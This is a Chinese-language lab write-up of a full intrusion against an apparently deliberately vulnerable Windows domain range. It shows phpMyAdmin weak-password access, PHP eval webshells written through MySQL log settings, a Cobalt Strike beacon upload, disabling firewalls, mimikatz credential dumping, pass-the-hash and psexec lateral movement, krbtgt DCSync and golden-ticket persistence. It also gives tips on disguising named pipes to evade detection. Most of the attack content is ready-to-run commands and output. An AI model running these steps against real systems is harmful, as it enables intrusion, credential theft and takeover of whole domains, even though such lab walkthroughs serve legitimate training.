# 信息收集
**端口服务扫描**

`nmap  192.168.242.60`   

```bash
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1025/tcp open  NFS-or-IIS
1026/tcp open  LSA-or-nterm
1027/tcp open  IIS
1028/tcp open  unknown
1048/tcp open  neod2
1051/tcp open  optima-vnet
3306/tcp open  mysql
```

`nmap -p 80,135,139,445,1025,1026,1027,1028,1048,1051,3306 -sV 192.168.242.60`

```bash
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: GOD)
1025/tcp open  msrpc        Microsoft Windows RPC
1026/tcp open  msrpc        Microsoft Windows RPC
1027/tcp open  msrpc        Microsoft Windows RPC
1028/tcp open  msrpc        Microsoft Windows RPC
1048/tcp open  msrpc        Microsoft Windows RPC
1051/tcp open  msrpc        Microsoft Windows RPC
3306/tcp open  mysql        MySQL (unauthorized)
```

可攻击利用方向

+ **<font style="color:rgb(15, 17, 21);">SMB服务（445端口）</font>**<font style="color:rgb(15, 17, 21);">：直接利用永恒之蓝（MS17-010）远程提权至SYSTEM，或空会话枚举用户与共享。</font>
+ **<font style="color:rgb(15, 17, 21);">MySQL服务（3306端口）</font>**<font style="color:rgb(15, 17, 21);">：尝试空密码登录，成功后写入WebShell或利用UDF执行系统命令。</font>
+ **<font style="color:rgb(15, 17, 21);">Web服务（80端口）</font>**<font style="color:rgb(15, 17, 21);">：扫描隐藏目录寻找注入或文件包含，同时利用Apache旧版漏洞辅助提权。</font>
+ **<font style="color:rgb(15, 17, 21);">MSRPC服务（135/1025+）</font>**<font style="color:rgb(15, 17, 21);">：枚举系统信息和用户列表，检测MS08-067漏洞，并通过DCOM执行远程命令。</font>
+ **<font style="color:rgb(15, 17, 21);">工作组横向移动</font>**<font style="color:rgb(15, 17, 21);">：抓取本地哈希进行Pass-the-Hash，配合NBNS/LLMNR欺骗捕获内网其他凭证。</font>
+ **<font style="color:rgb(15, 17, 21);">组合利用链</font>**<font style="color:rgb(15, 17, 21);">：先通过MySQL写Shell，再借助永恒之蓝提权，实现从数据库到系统控制的全路径。</font>

**目录扫描**

发现http://192.168.242.60/phpmyadmin/ 目录

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1784450249719-60619b70-2c05-4d70-9a2a-975b54ef032d.png)

**浏览网页**

http://192.168.242.60php探针页面

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1784451036075-dad10e67-87bb-4c81-b80c-8a0bb5920712.png)

访问http://192.168.242.60/phpmyadmin/

尝试弱口令root:root成功登录

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1784450933197-26b7ced1-f022-40d3-b0bf-ca174502a315.png)

# getshell
## 法1 phpMyAdmin 日志文件注入  
### 法1 mysql日志getshell
+ 已知绝对路径<font style="color:rgb(0, 0, 0);background-color:rgb(247, 247, 247);">C:/phpstudy_pro/WWW</font>
+ 有mysql的root权限

查看日志当前状态

```bash
SHOW VARIABLES LIKE '%general%';
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1784510621771-39d47feb-880b-472a-b9bc-88149a69483d.png)

开启通用日志查询

```bash
set global general_log="on"
```

修改日志文件路径

```bash
set global general_log_file='C:/phpStudy_pro/WWW/shell.php';
set global general_log_file="C:\phpStudy\WWW\shell.php";
```

写入webshell

```bash
SELECT '<?php eval($_POST[DY19sec]);?>'
```

蚁剑连接

```bash
http://192.168.242.62/shell.php
DY19sec
```

### 法2 慢查询getshell
+ 已知绝对路径<font style="color:rgb(0, 0, 0);background-color:rgb(247, 247, 247);">C:/phpstudy_pro/WWW</font>
+ 有mysql的root权限

查看慢查询状态

```bash
SHOW VARIABLES LIKE '%slow_query_log%';
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1784512745773-99f40713-5b8d-4cb6-9253-7c9d0833dd65.png)

开启慢查询

```bash
set global slow_query_log="on"
```

设置慢查询日志路径

```bash
set global slow_query_log_file="C:/phpStudy_pro/WWW/shell2.php"
```

写入webshell

```bash
SELECT '<?php @eval($_POST[123]);?>' OR sleep(11);
```

蚁剑连接

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1784513003408-9106388d-0dbd-49a7-bf26-73c227989915.png)

## 法2  phpMyAdmin 导出表数据写马（日志不可改时备用）  
+ 已知绝对路径<font style="color:rgb(0, 0, 0);background-color:rgb(247, 247, 247);">C:/phpstudy_pro/WWW</font>
+ 有mysql的root权限

查看权限与路径

```bash
SHOW VARIABLES LIKE '%secure%';
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785760272992-260831ea-76e4-433a-813d-2e0c6994fe9b.png)

secure_file_pri为NULL,此方法不可用

## 法3  YXCMS 源码备份漏洞 + CMS 后台上传漏洞  
<font style="color:rgb(15, 17, 21);">通过目录扫描工具（如御剑、dirsearch）可以发现一个名为 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">beifen.rar</font>`<font style="color:rgb(15, 17, 21);"> 或类似名称的备份文件</font>

<font style="color:rgb(15, 17, 21);">下载源码并分析</font>

<font style="color:rgb(15, 17, 21);">结果</font>

```bash
yxcms/
├── index.php                 # 单一入口
├── protected/
│   ├── config.php            # 全局配置
│   ├── core.php              # 核心路由, 自动加载, 运行
│   ├── base/                 # 基础框架层 (MVC基类, API基类)
│   ├── include/
│   │   ├── core/             # 框架核心 (缓存, 数据库, 模板引擎等)
│   │   ├── lib/              # 工具库 (验证, 图片, 分页, 上传, 备份等)
│   │   └── ext/              # 扩展 (PHPMailer, IP区域, 拼音等)
│   └── apps/                 # 应用模块
│       ├── admin/            # 后台管理
│       ├── default/          # 前台展示
│       ├── member/           # 会员系统
│       ├── install/          # 安装向导
│       └── appmanage/        # 应用管理
├── public/                   # 静态资源 (CSS, JS, 图片, 编辑器等)
├── data/
│   ├── db_back/              # 数据库备份
│   └── session/              # 会话文件
├── .htaccess & httpd.ini     # URL转发配置

管理员账户 admin:123456
```

<font style="color:rgb(15, 17, 21);">登录YXCMS后台</font>`http://192.168.242.98/yxcms/index.php?r=admin`

这里看不到登录窗口的验证码图片,所以路径中断

<font style="color:rgb(15, 17, 21);"></font>

# 内网渗透(cs打法)
```bash
netsh advfirewall show allprofile state      查看防火墙状态
 
netsh advfirewall set allprofiles state off   关闭防火墙
```

<font style="color:rgb(77, 77, 77);">在kali中启动Cobalt Strike 4.7 服务端</font>

```bash
chmod +x teamserver cobaltstrike start.sh  #添加权限
./teamserver 192.168.188.100 kali						#启动服务端(填靶机所在网段)
systemctl stop ufw											#关闭防火墙
```

启动客户端在kali中运行bbskali.cn.bat

**创建反向beacon,让靶机在cs上线**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1784615278392-a4b47787-c053-4d4b-ac9b-552581333ec2.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785662942399-bf0238b8-4d24-4736-ae73-4a3faa2c7429.png)

保存`beacon.exe`

用蚁剑上传到目标服务器

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1784548931886-1b1d89ef-4761-4657-a2cf-0c0d334248e8.png)

在蚁剑的虚拟终端执行`beacon.exe`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785662976959-942f3c74-6ad8-4da1-aa10-8c24f9feb60e.png)

看到靶机上线

## **信息收集**
查看网络配置

```bash
shell ipconfig
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785673455655-04bad234-cbd6-4c92-806c-abf938fae715.png)

查看本地用户

```bash
shell net user
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785673684657-9307377d-5459-49aa-8d26-6eb87f3d2f8f.png)

列举计算机

```bash
shell net view
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785673933305-63ab13cc-21c5-4b1d-801c-25c6158f51e0.png)

确认是为当前主机

```bash
shell hostname
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785674008817-2ccfb8e6-3598-432a-937b-7528e9048ce4.png)

<font style="color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);">查看当前计算机名、域、登录域等信息</font>

```bash
shell net config Workstation
```

查看几个域

```bash
shell net view /domain  
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785674455753-a0a4dcf7-bbe1-4183-ae46-736e7ef41acb.png)

**端口扫描**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785674748124-6acfd714-5c2a-4835-8c69-f75de9a785f2.png)

然后选择靶机所在网段

结果

```bash
(ARP) Target '192.168.242.47' is alive. 52-54-00-12-34-56

[08/02 08:48:32] [+] received output:
(ARP) Target '192.168.242.168' is alive. 52-54-00-12-34-57
192.168.242.47:139
192.168.242.47:135
192.168.242.47:80
192.168.242.47:445
```

**抓取铭文密码**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785677188446-94ff0bf6-364b-431e-aea5-b00ffa90c070.png)

结果

```bash
- 域管理员：GOD\Administrator
  - NTLM：ad8b1b80e5d43bd61ab6796242bc7daa
  - 明文：hongrisec@2025
- 本地用户：STU1\liukaifeng01
  - NTLM：ad8b1b80e5d43bd61ab6796242bc7daa
  - 明文：hongrisec@2025
- 机器账户：STU1$
  - NTLM：48cbcc1da42a20b412595706a64701fb

凭据重用：域管理员与本地用户凭据完全相同。

横向移动操作：
- 定位域控：使用 nltest /dclist:GOD 或根据 Logon Server 字段 OWA 确认
- 登录域控：jump psexec OWA GOD\Administrator hongrisec@2025
- 或哈希传递：pth GOD\Administrator ad8b1b80e5d43bd61ab6796242bc7daa
- 全内网部署：对存活主机使用域管凭据批量上线
- 终极目标：导出域控 NTDS.dit，制作金票据完成域持久化
```

## **横向移动**
+ <font style="color:rgb(31, 35, 41);background-color:rgba(0, 0, 0, 0);">PTH + jump psexec64 + SMB Beacon</font>
+ <font style="color:rgb(31, 35, 41);background-color:rgba(0, 0, 0, 0);">make_token + jump winrm64 + TCP Beacon</font>
+ <font style="color:rgb(31, 35, 41);background-color:rgba(0, 0, 0, 0);">PTT + jump wmic + TCP Beacon</font>
+ <font style="color:rgb(31, 35, 41);background-color:rgba(0, 0, 0, 0);">明文直接写在 jump 命令 + jump psexec64 + TCP Beacon</font>

### 凭据横向
#### 法1  PTH + psexec + SMB Beacon  
**获取初始Shell与抓取凭据**

此前在cs中->右键目标->access->run mimikatz

或者直接运行<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">logonpasswords</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785726243790-773be94b-85b6-4175-b3ee-4e9e82460164.png)

获取域管理员凭证

```bash
域名：GOD.ORG
域控主机名:OWA
用户名：Administrator
SID:S-1-5-21-2952760202-1353902439-2381784089-500
明文密码：hongrisec@2025
NTLM Hash：ad8b1b80e5d43bd61ab6796242bc7daa
LM Hash：edea194d76c77d875bab81ae20fa3c86
```

**建立SMB监听器**

cobalt strike->listeners->add->beacon smb

<font style="color:rgb(77, 77, 77);">pipename 最好改为 svcctl、spoolss、lsarpc 这种名字规避监测</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785727933568-48b99eac-1e89-4971-81e0-71ee2f82bcf4.png)

**注入域管令牌（Pass the Hash）**

<font style="color:rgb(15, 17, 21);">在已获得权限的Beacon会话中，使用</font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">pth</font>`<font style="color:rgb(15, 17, 21);">（Pass the Hash）命令，将之前获取的域管理员NTLM哈希注入到当前会话中</font>

```bash
pth GOD\Administrator ad8b1b80e5d43bd61ab6796242bc7daa
```

**横向移动到域控**

<font style="color:rgb(15, 17, 21);">使用</font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">jump</font>`<font style="color:rgb(15, 17, 21);">命令，通过PsExec的方式横向移动到域控主机OWA</font>

```bash
jump psexec64 OWA smb_pivot
```

**域控上线**

<font style="color:rgb(15, 17, 21);background-color:rgb(237, 243, 254);">域控成功上线</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785738661435-f56b5be5-49a1-4513-a69d-5d2957896e45.png)

## 权限维持
#### <font style="color:rgb(15, 17, 21);">在域控 Beacon 中抓取 KRBTGT 哈希</font>
选择owa的beacon,执行

```bash
mimikatz lsadump::dcsync /domain:GOD.ORG /user:krbtgt
```

获得结果

```bash
kbrigtg ntlm hash: 58e91a5ac358d86513ab224312314061
域sid:S-1-5-21-2952760202-1353902439-2381784089
```

**注入并制作黄金票据**

在owa beacon执行

```bash
mimikatz kerberos::golden /user:Administrator /domain:GOD.ORG /sid:S-1-5-21-2952760202-1353902439-2381784089 /krbtgt:58e91a5ac358d86513ab224312314061 /ptt
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785740129633-7a8eaf6b-6bf6-4541-bdf8-610a1c343538.png)

验证

```bash
shell klist
```

成功注入到当前会话

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785740613925-fd914e7f-144e-4051-9483-35122854318c.png)

测试是否生效

```bash
shell dir \\192.168.52.138\c$
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785740687133-521b261c-537e-4e66-907e-6ec59d1ab183.png)

**用票据获得域控**

****

